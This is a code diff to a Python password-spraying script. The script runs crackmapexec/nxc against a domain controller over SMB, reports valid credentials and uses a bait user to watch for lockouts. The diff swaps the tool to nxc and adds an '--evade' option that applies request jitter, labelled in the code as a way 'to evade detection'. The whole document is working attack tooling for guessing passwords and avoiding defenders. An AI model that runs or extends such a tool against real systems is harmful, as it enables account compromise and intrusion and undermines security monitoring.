@@ -22,6 +22,7 @@ def parse_args():
     p.add_argument('-a', '--attempts', default=1, type=int, help="Number of spray attempts per interval (default: 1)")
     p.add_argument('-bu', '--bait-user', required=False, help="Bait user to spray with invalid password before each interval")
     p.add_argument('-l', '--logfile', required=True, type=Path, help="File to append all CME output to")
+    p.add_argument('--evade', action='store_true', help="Enable jitter to evade detection")
     return p.parse_args()
 
 def load_list(path: Path):
@@ -30,13 +31,17 @@ def load_list(path: Path):
         sys.exit(1)
     return [line.strip() for line in path.read_text().splitlines() if line.strip()]
 
-def spray_password(dc_ip, users_file, password, logfile):
+def spray_password(dc_ip, users_file, password, logfile, evade=False):
     cmd = [
-        'crackmapexec', 'smb', dc_ip,
+        'nxc', 'smb', dc_ip,
         '-u', str(users_file),
         '-p', password,
         '--continue-on-success'
     ]
+
+    if evade:
+        cmd += ['--jitter', '2-5']
+
     retry_count = 0
     max_retries = 5
     while True:
@@ -57,11 +62,11 @@ def spray_password(dc_ip, users_file, password, logfile):
             f.write(output)
         return output
 
-def spray_bait_user(dc_ip, bait_user, logfile):
+def spray_bait_user(dc_ip, bait_user, logfile, evade=False):
     bait_file = Path(".bait_user.tmp")
     bait_file.write_text(bait_user + "\n")
     print(f"[>] Spraying bait user {bait_user} with invalid password {BAIT_PASSWORD}")
-    output = spray_password(dc_ip, bait_file, BAIT_PASSWORD, logfile)
+    output = spray_password(dc_ip, bait_file, BAIT_PASSWORD, logfile, evade=evade)
     bait_file.unlink()
     return output
 
@@ -116,12 +121,14 @@ def main():
     print("\033[1;33m[!] Always use maximum half the allowed attempts per interval.\033[0m")
     if args.bait_user:
         print("\033[1;33m[!] Make sure to add the bait user to the top of users list as well.\033[0m")
+    if args.evade:
+        print("\033[1;33m[!] Evade mode enabled: using jitter 2-5 to avoid detection.\033[0m")
 
     for i in range(0, len(passwords), args.attempts):
         attempt_passwords = passwords[i:i + args.attempts]
 
         if args.bait_user:
-            bait_out = spray_bait_user(args.dc_ip, args.bait_user, args.logfile)
+            bait_out = spray_bait_user(args.dc_ip, args.bait_user, args.logfile, evade=args.evade)
             bait_locked = check_lockouts(bait_out, users)
             if bait_locked:
                 print(f"{RED}[!] Bait user '{args.bait_user}' got locked out!{RESET}")
@@ -130,7 +137,7 @@ def main():
 
         for attempt, pwd in enumerate(attempt_passwords):
             print(f"[>] Spraying password: {pwd} (Attempt {attempt + 1}/{len(attempt_passwords)})")
-            out = spray_password(args.dc_ip, args.users, pwd, args.logfile)
+            out = spray_password(args.dc_ip, args.users, pwd, args.logfile, evade=args.evade)
 
             valid_creds = check_valid_creds(out, users)
             for cred in valid_creds:
@@ -164,4 +171,3 @@ def main():
 
 if __name__ == '__main__':
     main()
-    
